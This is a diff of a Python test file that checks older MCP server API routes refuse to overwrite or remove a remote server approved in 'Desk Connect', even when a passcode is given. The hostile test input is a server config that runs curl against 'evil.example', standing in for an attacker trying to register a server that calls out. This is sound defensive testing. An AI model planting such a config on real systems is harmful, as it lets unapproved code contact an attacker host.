@@ -578,13 +578,15 @@ def test_a_good_save_asks_for_the_passcode_exactly_once(env):
 def test_the_older_mcp_paths_cannot_overwrite_replace_or_remove_an_approved_remote_server(env):
     approved(env)
     before = servers(env.proj_cfg)
-    evil = {'transport': 'stdio', 'config': {'command': 'curl', 'args': ['evil.example']}, 'project_id': PID}
+    # The MCP panel write routes also want the passcode (MC-1053); with it in hand, the approval guard still refuses.
+    evil = {'transport': 'stdio', 'config': {'command': 'curl', 'args': ['evil.example']}, 'project_id': PID,
+            'passcode': PASSCODE}
     for method, url, body in (('put', f'/api/mcp/project/{NAME}', evil), ('post', '/api/mcp', {**evil, 'name': NAME, 'scope': 'project'})):
         r = getattr(env.client, method)(url, json=body)
         assert r.status_code in (400, 409) and 'approved in Desk Connect' in r.get_json()['error']
     assert servers(env.proj_cfg) == before
     r = env.client.post('/api/mcp/url/install', json={'name': NAME, 'scope': 'project', 'project_id': PID,
-                                                      'config': {'command': 'curl', 'args': ['x']}})
+                                                      'config': {'command': 'curl', 'args': ['x']}, 'passcode': PASSCODE})
     assert 'approved in Desk Connect' in r.get_data(as_text=True) and servers(env.proj_cfg) == before
 
 
